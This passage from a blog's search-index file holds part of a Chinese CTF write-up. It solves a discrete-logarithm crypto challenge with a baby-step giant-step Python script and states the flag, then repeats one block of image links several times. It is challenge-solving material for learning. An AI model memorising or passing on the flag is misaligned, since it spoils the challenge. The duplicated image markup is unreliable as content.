src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/FjFLbc13KC.png?imageslim" alt="mark"><br>pow(0x1111111111,flag,0x976693344d) = 0x7ac21f64ed</p><p>不会，查了很多资料才知道BSGGS算法。python脚本：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from math import ceil, sqrt</span><br><span class="line"> </span><br><span class="line">def bsgs(g, h, p):</span><br><span class="line">    N &#x3D; ceil(sqrt(p - 1))</span><br><span class="line">    tbl &#x3D; &#123;pow(g, i, p):i for i in range(N)&#125;</span><br><span class="line">    c &#x3D; pow(g, N * (p - 2), p)</span><br><span class="line">    for j in range(N):</span><br><span class="line">        y &#x3D; (h * pow(c, j, p)) % p</span><br><span class="line">        if y in tbl:</span><br><span class="line">            result&#x3D;(j * N + tbl[y])</span><br><span class="line">            print(hex(result))</span><br><span class="line">    return None</span><br><span class="line">print(bsgs(0x1111111111, 0x7ac21f64ed , 0x976693344d))</span><br></pre></td></tr></table></figure><p>flag ： x1337</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JJdie248A4.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/gd25ef4EeC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/ej2FL8DjfB.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/If9CL4GK5e.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180213/a89gJh73di.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/lEc3leChHd.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JG416AGfbj.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/7LEiG3Bl3f.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/L2h06fljlH.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/A0jHdJjk86.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/mEA6l99FaG.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/d86g3JHejE.jpg?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/ci2AgF42fC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/8hc9FDgaCb.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/50106kHbm7.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/GK5g9CB1ma.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/FjFLbc13KC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JJdie248A4.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/gd25ef4EeC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/ej2FL8DjfB.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/If9CL4GK5e.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180213/a89gJh73di.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/lEc3leChHd.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JG416AGfbj.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/7LEiG3Bl3f.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/L2h06fljlH.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/A0jHdJjk86.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/mEA6l99FaG.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/d86g3JHejE.jpg?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/ci2AgF42fC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/8hc9FDgaCb.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/50106kHbm7.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/GK5g9CB1ma.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/FjFLbc13KC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JJdie248A4.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/gd25ef4EeC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/ej2FL8DjfB.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/If9CL4GK5e.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180213/a89gJh73di.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/lEc3leChHd.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JG416AGfbj.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/7LEiG3Bl3f.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/L2h06fljlH.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/A0jHdJjk86.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/mEA6l99FaG.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/d86g3JHejE.jpg?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/ci2AgF42fC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/8hc9FDgaCb.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/50106kHbm7.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/GK5g9CB1ma.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/FjFLbc13KC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JJdie248A4.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/gd25ef4EeC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/ej2FL8DjfB.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/If9CL4GK5e.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180213/a89gJh73di.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/lEc3leChHd.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JG416AGfbj.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/7LEiG3Bl3f.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/L2h06fljlH.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/A0jHdJjk86.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/mEA6l99FaG.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/d86g3JHejE.jpg?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/ci2AgF42fC.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/8hc9FDgaCb.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/50106kHbm7.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/GK5g9CB1ma.png?imageslim" alt="mark"><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/FjFLbc13KC.png?imageslim" alt="mark">   </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
